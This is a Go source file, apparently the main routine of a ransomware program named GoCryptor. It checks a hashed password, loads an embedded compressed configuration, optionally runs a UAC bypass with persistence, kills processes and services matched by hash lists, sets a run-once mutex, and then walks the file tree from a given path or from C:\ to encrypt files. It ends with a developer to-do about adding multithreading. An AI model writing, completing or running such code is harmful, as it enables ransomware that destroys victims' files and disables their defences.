package main

import (
	"flag"
	"math/rand"
	"os"
	"path/filepath"
	"time"

	"github.com/rodolfoag/gow32"
)

var args []string
var GoCryptorConfig Configuration

func main() {
	targetPathPtr := flag.String("path", "", "A target path to encrypt")
	password := flag.String("pass", "", "Password for cryptor")
	flag.Parse()

	if bufferHashing([]byte(*password)) != 0x752e29f1 {
		return
	}

	decompressedConfig, err := decompress(CompressedConfig)
	if err != nil {
		panic(err)
	}
	GoCryptorConfig, err = parseConfig(decompressedConfig)
	if err != nil {
		panic(err)
	}

	// escalation flag
	if GoCryptorConfig.privilegeEscalationFlag {
		ex, err := os.Executable()
		if err != nil {
			panic(err)
		}
		exPath := filepath.Dir(ex)
		uacBypassPersist(exPath)
	}

	//terminate process flag
	if GoCryptorConfig.terminateProcessFlag {
		processList, err := getProcesses()
		if err != nil {
			panic(err)
		}
		killTargetProcesses(processList, GoCryptorConfig.processHashList)
	}

	// service kill flag
	if GoCryptorConfig.deleteServiceFlag {
		killTargetServices(GoCryptorConfig.serviceHashList)
	}

	var mutexHandle uintptr
	if GoCryptorConfig.runOnceFlag {
		mutexHandle, err = gow32.CreateMutex(string(GoCryptorConfig.runOnceString[:]))
		if err != nil {
			panic(err)
		}
	}

	defer CloseHandle(mutexHandle)

	rand.Seed(time.Now().UTC().UnixNano())

	if *targetPathPtr != "" {
		DFSTraverseSingle(*targetPathPtr)
	} else {
		DFSTraverseSingle("C:\\")
	}
}

// Things to do:
// - Multithreading
